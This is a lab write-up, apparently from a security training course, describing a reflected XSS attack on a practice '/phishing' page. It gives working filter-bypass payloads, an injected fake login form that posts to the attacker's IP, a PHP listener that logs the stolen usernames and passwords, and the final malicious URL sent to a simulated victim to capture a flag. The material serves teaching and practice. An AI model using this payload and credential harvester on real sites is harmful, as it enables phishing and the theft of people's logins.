# Phishing

### Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.

In many online forums and web applications, there are opportunities to manipulate how a page displays content through a technique known as Cross-Site Scripting (XSS). XSS is a security vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. When we attempt to use a basic XSS payload, we might find that it doesn’t execute as expected, often resulting in an error icon that indicates a broken image link. This is a common issue when the application has security measures in place to prevent such injections.

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-11 22-30-03 (3).png" alt=""><figcaption></figcaption></figure>

### Step 1: Understanding the Target Application

1. **Identify the Input Field**: Locate the input field where user input is accepted (e.g., an image URL input).
2. **Analyze the Output**: Use browser developer tools (F12) to inspect how your input is rendered in the HTML.
   * {% code overflow="wrap" %}
     ```html
     <html lang="en">
     <body style="background-color: #141d2b; font-family: sans-serif; color: white;">
         <!-- --SNIP-- -->
         <img src='test'>
     </body>
     </html>
     ```
     {% endcode %}

### Step 2: Initial Payload Testing

1. **Basic XSS Payload**: Start with a simple payload:

```markup
<script>alert(1);</script>
```

* Input this into the image URL field and submit.
* If the alert box appears, you have confirmed an XSS vulnerability.

2. **Check for Output Encoding**: If the payload does not execute, check for HTML entities (e.g., `&lt;` for `<`).

### Step 3: Crafting a Working Payload

1. **Bypass Filters**: If basic payloads are blocked, try variations:
   * Use alternative tags or attributes;
   * Incorporate Special Characters:&#x20;

```html
'><script>alert(1);</script>
```

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-11 22-32-28 (2).png" alt=""><figcaption></figcaption></figure>

2. **Inspecting the HTML Output**: After submitting your payload, view the page source to see how your input is rendered.

### Step 4: Developing the Phishing Payload

1. **Create a Login Form**: Use `document.write()` to inject the phishing form:

{% code overflow="wrap" %}
```html
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
{% endcode %}

2. **Remove Existing Elements**: To make the phishing form more convincing, remove the original input field:

```javascript
document.getElementById('urlform').remove();
```

3. **Combine the Code**: Your final payload might look like this:

{% code overflow="wrap" %}
```javascript
document.write('<h3>Please login to continue</h3><form action=http://YOUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove()
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Step 5: Setting Up the Listener

1. **Using PHP**: Create a PHP script to log the credentials:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://YOUR_SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

* Save this as `index.php` and run a PHP server:

```bash
sudo php -S 0.0.0.0:80
```

### Step 6: Executing the Attack

1. **Craft the Malicious URL**: Combine the target URL with your payload:

{% code overflow="wrap" %}
```html
http://YOUR_SERVER_IP/phishing/index.php?url='><script>document.write('<h3>Please login to continue</h3><form action=http://10.10.14.32><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove()</script>;<!--

```
{% endcode %}

2. **Send the URL**:

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-11 23-24-24 (2).png" alt=""><figcaption></figcaption></figure>

2. **Capture Credentials**: When a victim logs in, their credentials will be sent to your server, and you can check `creds.txt` for the captured information.

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-11 23-25-12 (2).png" alt=""><figcaption></figcaption></figure>

### Step 7: Test the captured the credentials

1. Go to http://SERVER\_IP/phishing/login.php and enter the captured credentials to retrieve the flag:

<figure><img src="../../../.gitbook/assets/Screenshot from 2024-10-11 23-25-47 (1).png" alt=""><figcaption></figcaption></figure>











